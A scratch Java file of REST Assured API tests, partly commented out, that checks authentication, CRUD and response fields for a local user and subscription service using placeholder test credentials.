////                .statusCode(200);
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .when().delete(getServiceURI() + "/api/user/4").then()
////                .statusCode(403);
//////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("dba", "dba123")
//////                .when().delete(getServiceURI() + "/api/user/4").then()
//////                .statusCode(200);
//
//    @Override
//    public GetCouponResponse getCoupon(final GetCouponRequest couponRequest) {
//        return given()
//                .log().all()
//                .contentType(ContentType.JSON)
//                .accept(ContentType.JSON)
//                .auth().basic("user", "user123")
//                .when()
//                .get(this.buildFullPath(couponRequest))
//                .then()
//                .log().all()
//                .body("name", equalTo("subscription3"))
//                .statusCode(200)
//                .extract()
//                .as(GetCouponResponse.class);
//    }
//
//    private URI buildFullPath(final GetCouponRequest request) {
//        final EndpointProperty.RouteInfo routeInfo = this.endpointProperty.getRoutes().get("coupons-api");
//        return UriComponentsBuilder
//                .fromUriString(routeInfo.getBasePath())
//                .path(routeInfo.getSegmentPath())
//                .path("/")
//                .path(request.getSerialNumber())
//                .build()
//                .toUri();
//    }
//
//    private RequestSpecification buildRequestSpecification() {
//        return new RequestSpecBuilder()
//                .setBaseUri("http://localhost")
//                .setPort(8080)
//                .setAccept(ContentType.JSON)
//                .setContentType(ContentType.ANY)
//                .log(LogDetail.ALL)
//                .build();
//    }
////
////    private Optional<GetCouponResponse> getEmptyIfNotFoundOrRethrow(final HttpStatusCodeException e) {
////        final HttpStatus statusCode = e.getStatusCode();
////        if (!statusCode.equals(HttpStatus.NOT_FOUND)) {
////            rethrowSpecificException(e);
////        }
////        return Optional.empty();
////    }
////
////    private void rethrowSpecificException(final Exception e) {
////        rethrowRestServiceSpecificException(e, "Authority service is not available!", "Error is occurred when calling Authority service");
////    }
//}
//
//
////    RequestSpecification requestSpec = new RequestSpecBuilder()
////            .setBaseUri("http://localhost")
////            .setPort(8080)
////            .setAccept(ContentType.JSON)
////            .setContentType(ContentType.ANY)
////...
////        .log(LogDetail.ALL)
////        .build();
////
////// можно задать одну спецификацию для всех запросов:
////        RestAssured.requestSpecification = requestSpec;
////
////// или для отдельного:
////        given().spec(requestSpec)...when().get(someEndpoint);
////
////        ResponseSpecification responseSpec = new ResponseSpecBuilder()
////        .expectStatusCode(200)
////        .expectBody(containsString("success"))
////        .build();
////
////// можно задать одну спецификацию для всех ответов:
////        RestAssured.responseSpecification = responseSpec;
////
////// или для отдельного:
////        given()...when().get(someEndpoint).then().spec(responseSpec)...;
//
////// то же самое работает и в обратную сторону:
////SomePojo pojo = given().
////    .when().get(EndPoints.get)
////            .then().extract().body().as(SomePojo.class);
//
////    @Test
////    public void whenLogOnlyIfValidationFailed_thenSuccess() {
////        when().get("/users/eugenp")
////                .then().log().ifValidationFails().statusCode(200);
////
////        given().log().ifValidationFails()
////                .when().get("/users/eugenp")
////                .then().statusCode(200);
////    }
////
////    @Test
////    public void whenLogResponseIfErrorOccurred_thenSuccess() {
////
////        when().get("/users/eugenp")
////                .then().log().ifError();
////        when().get("/users/eugenp")
////                .then().log().ifStatusCodeIsEqualTo(500);
////        when().get("/users/eugenp")
////                .then().log().ifStatusCodeMatches(greaterThan(200));
////    }
//
////    @Test
////    public void whenUpdatePerson_thenStatus200() {
////        long id = createTestPerson("Nick").getId();
////        Person person = new Person("Michail");
////        given().pathParam("id", id).log()
////                .body().contentType("application/json").body(person)
////
////                .when().put("/persons/{id}")
////
////                .then().log().body().statusCode(HttpStatus.OK.value())
////                .and().body("name", equalTo("Michail"));
////    }
////
////    @Test
////    public void givenNoPerson_whenGetPerson_thenStatus500() {
////        given().pathParam("id", 1)
////                .when().get("/persons/{id}")
////
////                .then().log().body()
////                .statusCode(HttpStatus.INTERNAL_SERVER_ERROR.value());
////    }
-----------------------------------------------------------------------------------------

-----------------------------------------------------------------------------------------
    @Test
    public void testAddUserSubscription() {
        final UserDTO user1 = given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/1").as(UserDTO.class);
        final SubscriptionDTO subscription3 = given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscription/3").as(SubscriptionDTO.class);

        assertTrue(Objects.equals("user1@gmail.com", user1.getLogin()));
        //assertTrue(Objects.equals(User.UserStatusType.UNVERIFIED, user1.getStatus()));
        assertTrue(Objects.equals("subscription3", subscription3.getTitle()));
        assertTrue(Objects.equals(SubscriptionStatusInfo.StatusType.STANDARD, subscription3.getStatus()));

        final UserSubOrderDTO userSubOrder = new UserSubOrderDTO();
        userSubOrder.setUser(user1);
        userSubOrder.setSubscription(subscription3);
        userSubOrder.setCreatedBy(user1.getLogin());
        userSubOrder.setStartedAt(DateUtils.strToDate("2017-05-28 00:00:00+0300"));
        //userSubOrder.setStartedAt("2017-05-28 00:00:00");

        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
                .body(userSubOrder)
                .when().post(getServiceURI() + "/api/user/{id}/subscription", user1.getId()).then()
                .statusCode(201);
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/{id}/subscriptions", user1.getId()).then()
                .body("name", hasItem("subscription3"))
                .statusCode(200);
    }
	
	    @Test
    public void testForbiddenAccess() {
        given().when().get(getServiceURI() + "/api/users").then().statusCode(401);
    }

    @Test
    public void testAuthorizationAccess() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/users").then().statusCode(200);
    }

    @Test
    public void testNotFound() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/userss").then().statusCode(404);
    }

    @Test
    public void testVerifyUser2() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/2").then()
                .body("login", equalTo("user2@gmail.com"))
                .body("name", equalTo("user2"))
                .body("createdBy", equalTo("user2@gmail.com"))
                .body("age", equalTo(26))
                .body("phone", equalTo("+79211234567"))
                //.body("gender", equalTo(User.UserGenderType.MALE.toString()))
                .body("id", equalTo(2))
                .body("createdAt", equalTo("2017-04-30 00:00:00+0300"))
                .body("modifiedAt", nullValue())
                .body("rating", equalTo(1.0f))
                .body("registeredAt", equalTo("2017-04-30 00:00:00+0300"))
                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
                .statusCode(200);
    }
	
	
	    @Test
    public void testUpdateUser() {
        final UserDTO user1 = given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/1").as(UserDTO.class);

        assertTrue(Objects.nonNull(user1));
        assertTrue(Objects.equals("user1@gmail.com", user1.getLogin()));
        assertTrue(Objects.equals(UserAccountStatusInfo.StatusType.UNVERIFIED, user1.getStatus()));

        UserActivityStatusInfoDTO status = new UserActivityStatusInfoDTO();
        status.setStatusType(UserActivityStatusInfo.StatusType.CHALLENGING);
        user1.setStatus(status);

        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
                .body(user1)
                .when().put(getServiceURI() + "/api/user/{id}", user1.getId()).then()
                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
                .statusCode(200);
    }
	
  @Test
    public void testForbiddenAccess() {
        given().when().get(getServiceURI() + "/api/subscriptions").then().statusCode(401);
    }

    @Test
    public void testAuthorizationAccess() {
        //.auth().digest( ADMIN_USERNAME, ADMIN_PASSWORD )
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscriptions").then().statusCode(200);
    }

    @Test
    public void testNotFound() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscriptionss").then().statusCode(404);
    }

    @Test
    public void testVerifySubscription1() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscription/1").then()
                .body("name", equalTo("subscription1"))
                .body("createdBy", equalTo("admin"))
                .body("expiredAt", equalTo(1544562000000L))
                .body("expiredAt", equalTo("2018-12-12 00:00:00+0300"))
                .body("id", equalTo(1))
                .body("createdAt", equalTo("2018-12-12 00:00:00+0300"))
                .body("modifiedAt", nullValue())
                .body("type", equalTo(SubscriptionStatusInfo.StatusType.PREMIUM.toString()))
                .statusCode(200);
    }

    @Test
    public void testAddSubscription() {
        final SubscriptionDTO subscription = new SubscriptionDTO();
        subscription.setExpiredAt(DateUtils.strToDate("2018-08-28 00:00:00+0300"));
        //subscription.setExpireAt("2018-08-28 00:00:00");
        subscription.setCreatedBy("admin");
        subscription.setTitle("Guest Group");
        //subscription.setPrefix('standard');
        subscription.setStatusType(SubscriptionStatusInfo.StatusType.STANDARD);

        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
                .body(getObjectAsString(subscription))
                .when().post(getServiceURI() + "/api/subscription").then()
                .statusCode(201);
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscriptions").then()
                .body("name", hasItem("Guest Group"))
                .statusCode(200);
    }

    @Test
    public void testUpdateSubscription() {
        final SubscriptionDTO subscription1 = given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscription/1").as(SubscriptionDTO.class);

        assertTrue(Objects.nonNull(subscription1));
        assertTrue(Objects.equals("subscription1", subscription1.getTitle()));
        assertTrue(Objects.equals(SubscriptionStatusInfo.StatusType.PREMIUM, subscription1.getStatus()));

        subscription1.setExpiredAt(DateUtils.strToDate("2019-04-18 00:00:00+0300"));
        //subscription1.setExpireAt("2019-04-18 00:00:00");

        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
                .body(subscription1)
                .when().put(getServiceURI() + "/api/subscription/{id}", subscription1.getId()).then()
                //                .body("expireAt", equalTo(1555534800000L))
                .body("expireAt", equalTo("2019-04-18 00:00:00"))
                .statusCode(200);
    }

    @Test
    public void testDeleteSubscription() {
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/subscription/4").then()
                .body("name", equalTo("Guest Group"))
                .statusCode(200);
        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
                .when().delete(getServiceURI() + "/api/subscription/4").then()
                .statusCode(403);
//        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("dba", "dba123")
//                .when().delete(getServiceURI() + "/api/subscription/4").then()
//                .statusCode(200);
    }
